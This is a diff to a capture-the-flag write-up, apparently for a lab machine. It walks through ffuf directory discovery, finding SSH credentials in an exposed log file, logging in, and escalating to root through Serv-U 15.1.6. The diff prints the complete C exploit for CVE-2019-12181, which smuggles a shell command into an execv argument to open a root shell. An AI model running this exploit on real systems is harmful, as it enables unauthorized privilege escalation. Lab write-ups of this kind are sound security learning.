@@ -40,4 +40,57 @@
         |_http-title: Apache2 Ubuntu Default Page: It works
         Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-- Scanning for directories reveals 
+- Scanning for directories with ffuf reveals these directories
+
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0314db07-803b-49bc-b0fc-ee0c8089e292)
+
+- I scanned the `/election/` directory with ffuf and I discovered an `admin`directory
+
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e9318af5-7af0-4627-8e99-509b8a5f218c)
+
+- Ffuf discovered a `/logs/` directory after scanning the `/admin/` direcotory
+
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f8d1babc-3df0-499d-9e5d-95816226f9a4)
+  
+- The logs directory contains a log file which reveals love ssh credentials
+
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f7af2def-4872-48a4-adce-0e122f54a5ac)
+
+- SSH access
+
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/03e41edd-2b47-4cab-aa7f-88eacd63fe79)
+
+### PRIVESC
+
+- The server contains a Serv-U ver 15.1.6 which has a local privilege escalation exploit.
+
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d6e86270-d4f9-45f3-8e2d-2cee57510d17)
+
+        /*
+        
+        CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation 
+        
+        vulnerability found by:
+        Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev
+        
+        to compile and run:
+        gcc servu-pe-cve-2019-12181.c -o pe && ./pe
+        
+        */
+        
+        #include <stdio.h>
+        #include <unistd.h>
+        #include <errno.h>
+        
+        int main()
+        {       
+            char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
+            int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
+            // if execv is successful, we won't reach here
+            printf("ret val: %d errno: %d\n", ret_val, errno);
+            return errno;
+        }
+
+- Root access
+
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1107846c-a02b-4b04-8687-faf002fae805)
